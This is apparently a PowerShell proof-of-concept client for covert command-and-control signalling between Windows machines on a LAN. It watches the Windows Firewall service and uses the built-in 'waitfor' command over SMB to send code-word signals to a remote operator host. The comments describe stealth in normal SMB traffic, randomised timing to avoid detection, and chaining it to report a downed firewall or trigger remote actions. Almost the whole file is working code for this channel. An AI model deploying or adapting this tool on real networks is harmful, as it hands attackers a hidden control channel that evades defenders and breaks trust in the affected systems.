<#
20151106 - Windows Lan to Lan Signals Intelligence Client v1.0

https://github.com/dc401
dchow[AT]xtecsystems.com
 
Basic PoC signaling script for Windows 7x or higher machines to generate
codified signals to each other and to take action based on case conditions.
A baseline signal is established and changes to the baseline case will be
evaluated and action taken based on this change.

The script demonstrates basic stealth using existing SMB transmissions chatter,
codification of words only useful to the operator, and is resourceful because
of no need to pull down external tools

Syntax:
winL2L_SIGC2_client.ps1 baseSignal changeSignal IPAddr

Example: WinL2L_SIGC2_client.ps1 foobar woot 192.168.1.100


#>

#CLI arguments
param([string]$base, [string]$sig, [string]$dest)

#$dest = "127.0.0.1"
#$base = "foobar"
#$sig = "woot"

#Loop Counter Var
$loopCounter = 0
#Random Time Var
$randomTime = Get-Random -Minimum 1 -Maximum 10

#Send the baseline signal
DO {

    #setup case condition to check for changes like Windows Firewall running status
    $fwstatus = Get-Service | Where-Object -Property "Name" -EQ "MpsSvc" `
    | Select -ExpandProperty "Status".toString()

    #case logical evaluation
    switch ($fwstatus)
        {
            <#eval var and stop on first match via break
            change the baseline code word being sent if the service is stopped
            chain commands to make it to do things like inform an external party
            that the firewall is down, launch things, and send the change signal
            to the server version of this script to execute an action

            We also use a randomized time between signals sent to make it harder to detect

            #>
            { $fwstatus -eq "Running" } { Start-Sleep -s $randomTime; waitfor /S $dest /SI $base; `
            Write-Host "FW UP Signal Sent"; break }
            { $fwstatus -eq "Stopped" } { $base = $sig; Start-Sleep -s $randomTime; `
            waitfor /S $dest /SI $base; Write-Host "FW DOWN Signal Sent"; $loopCounter++; break }
        }


   }

#stop condition of do while
WHILE ($loopCounter -lt 1)
exit
